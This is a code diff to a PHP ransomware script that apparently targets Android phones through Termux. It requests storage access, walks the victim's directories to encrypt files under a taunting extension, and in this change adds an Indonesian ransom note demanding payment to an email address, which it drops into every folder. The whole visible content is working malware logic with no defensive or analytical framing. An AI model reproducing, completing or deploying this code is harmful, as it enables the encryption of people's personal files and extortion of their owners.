@@ -3,6 +3,7 @@
 	/* open termux-setup-storage */
 	system('termux-setup-storage');
 	$ext = "bapa_lo_heker";
+	$text = "Hp anda telah terkena Ransomware :'D silahkan Kontak timtam.rpl@gmail.com dan membayar 500k untuk mendapatkan kunci nya, iam heker";
 
 	function encryptFile($value, $dir){
 
@@ -29,6 +30,7 @@
         
         /* global variabel */
         global $ext;
+        global $text;
 
         $fileList = glob($dir."/*");
         foreach ($fileList as $filename) {
@@ -45,6 +47,12 @@
                     }
                 }
             }else{
+
+            	/* create file */
+            	$o = fopen($dir.'/baca_aku_mas.txt', 'w');
+	            fwrite($o, $text);
+	            fclose($o);
+
                 getFile($filename);
             }
         }   
@@ -67,13 +75,8 @@
         	// dir ditemukan
         	getFile($dir);
         }else{
-        	echo "tidak ketemu " . $dir;
+        	echo "tidak ketemu";
         }
-
-        // $root = $key.":\\";
-        // $ext  = $files->ext;
-        // $extLength = strlen($ext) + 1;
-        // getFile($root);
     }
 
 ?>
